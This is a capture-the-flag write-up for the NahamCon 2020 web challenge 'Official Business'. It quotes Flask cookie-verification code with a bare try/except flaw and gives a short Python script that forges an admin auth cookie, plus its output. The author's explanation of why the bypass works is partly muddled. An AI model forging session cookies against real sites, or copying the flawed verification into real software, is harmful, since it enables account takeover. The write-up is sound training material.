# NahamCon CTF 2020 - Official Business

- Resource: NahamCon CTF 2020
- CTF Name: Official Business
- Points: 125
- Category: Web

Note::: This CTF is expired and no longer live so flags will be posted.



## Flag1
 __Hint__ 
 1. Are you here on official business? Prove it.  


 __Acquired By:__
### Step 1. General Look Around
When first looking at this page there is a login form that mentions me needing to login as admin. ![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/xuwmmep0lutib7i0gzue.png) However, if I try and login I get a 403 page. I did try to check if the input would respond to non-words like `'":;.?[]{}` and the like, but nothing changed. I also went down the path of trying to resend the data in the request to have an extra parameter of "auth=admin", "admin=True", and a few others along this with variation, but no luck.

From here I decided to see if there was and extra pages like `/admin` or `robots.txt` and though admin was not there robots.txt was and it was full of code.




### Step 2. How is this information helpful?
The robots.txt file is there for web spiders like Google and other search engines and it tells the spiders that some assets are out of scope and they need to leave them alone when indexing a site for their search engine. Though this page is generally only accessible by spiders if it is accessible by a user it can be a treasure trove of useful information.

In this case, the `robots.txt` file is full of code that appears to be the code for how the cookie is set for the admin on login... hmmm ![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/4engsndxo824b3qwg4km.png)

__After reviewing the code a specific line jumps out at me:__
```
def login()

    user = request.form.get("user", "")
    password = request.form.get("password", "")

    if (
        user != "hacker"
        or hashlib.sha512(bytes(password, "ascii")).digest()
        != b"hackshackshackshackshackshackshackshackshackshackshackshackshack"
    ):
        return abort(403)
    return do_login(user, password, True)
```

Oh la la!! If user is not "hacker" or the hash for the password is not b"hackshackshackshackshackshackshackshackshackshackshackshackshack" it will return the 403 page. At this point I tried to login as "hacker", but that didn't work. I tried "hacker" and password of "hackshackshackshackshackshackshackshackshackshackshackshackshack", and a few variations of this, but nothing worked.


__A section that pops out to me is the do_login.__
```
def do_login(user, password, admin):

    cookie = {"user": user, "password": password, "admin": admin}
    cookie["digest"] = hashlib.sha512(
        app.secret_key + bytes(json.dumps(cookie, sort_keys=True), "ascii")
    ).hexdigest()

    response = make_response(redirect("/"))
    response.set_cookie("auth", binascii.hexlify(json.dumps(cookie).encode("utf8")))

    return response
```

__So what is the do_login() doing?__
The `def do_login(user, password, admin)` is accepting the "user, password, admin" as parameters.
Then the line `cookie = {"user": user, "password": password, "admin": admin}` takes them and sets them in an array called "cookie".

Now it creates a `cookie["digest"]` that will be using the hashlib to make a sha512 hash of the app.secret_key concatenated with the `bytes(json.dumps(cookie, sort_keys=True), "ascii")`. It then uses `.hexdigest()` to return a hex string representing the hash.

Now that the cookies are made it then sets a redirect of '/' with the `response = make_response(redirect("/"))` and sets the cookie as 'auth' in the browser with `    response.set_cookie("auth", binascii.hexlify(json.dumps(cookie).encode("utf8")))` which are both returned.



__It's also interesting to notice the load_cookie section:__
```
def load_cookie():

    cookie = {}
    auth = request.cookies.get("auth")
    if auth:

        try:
            cookie = json.loads(binascii.unhexlify(auth).decode("utf8"))
            digest = cookie.pop("digest")

            if (
                digest
                != hashlib.sha512(
                    app.secret_key + bytes(json.dumps(cookie, sort_keys=True), "ascii")
                ).hexdigest()
            ):
                return False, {}
        except:
            pass

    return True, cookie
```

Looking at the code above I notice a few things.. When the page is loaded the code will make a request for the cookie with `auth = request.cookies.get("auth")`. If the 'auth' cookie is present it will then enter a try/except block where it will "unhexlify" the cookie and decode it. From here it will pop the "digest" off of the decoded cookie and that digest is compared with the sha512 of the secret_key + bytes(json.dumps(cookie, sort_keys=True). 
However, the secret_key is used wrong here and basically doesn't matter because in do_login the value for cookie["digest"] is obtained by concatenating the secret_key to the rest of the keys from the cookie and this will allow abuse by crafting my own cookie.












### Step 4. The Exploit
Because of the wrong use of the secrect_key in the load_cookie I can make a cookie with any values and it will pass the verification from load_cookie. 

To make my own cookie I made a simple Python script as follows:
```
import binascii
import hashlib
import json

cookie = {"user": 'hacker', "password": 'password', "admin": True}
cookie["digest"] = 'hackshackshackshackshackshackshackshackshackshackshackshackshack'
print(binascii.hexlify(json.dumps(cookie).encode("utf8")))
```

This script will make a cookie from the `"user": 'hacker', "password": 'password', "admin": True` information, creates a cookie digest with the 'hackshackshackshackshackshackshackshackshackshackshackshackshack', and then print a hexlify of the cookie with the digest.

In this case I created the cookie value of: `b'7b2275736572223a20226861636b6572222c202270617373776f7264223a202270617373776f7264222c202261646d696e223a20747275652c2022646967657374223a20226861636b736861636b736861636b736861636b736861636b736861636b736861636b736861636b736861636b736861636b736861636b736861636b736861636b227d'`




### Step 5. The Flag
Now that I have a cookie I can go to the browser and add it to the main page. Then on refresh the flag appears.![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/8bekc9oqz5ae0zqp6cof.png)




## Learned
This CTF taught me about reading over the code slowly to follow the flow of data and really understand what each line is doing and how this code created a cookie but lacked proper verification.



<hr>

Happy Hacking
![](https://media.giphy.com/media/l3vRmVv5P01I5NDAA/giphy.gif)

### Resources
1. https://docs.python.org/2/library/hashlib.html
2. https://www.pythoncentral.io/hashing-strings-with-python/
3. https://docs.python.org/3/library/hashlib.html
4. https://www.php.net/manual/en/function.isset.php

###### Please Note: that I am still learning and if something that I have stated is incorrect please let me know. I would love to learn more about what I may not understand fully.
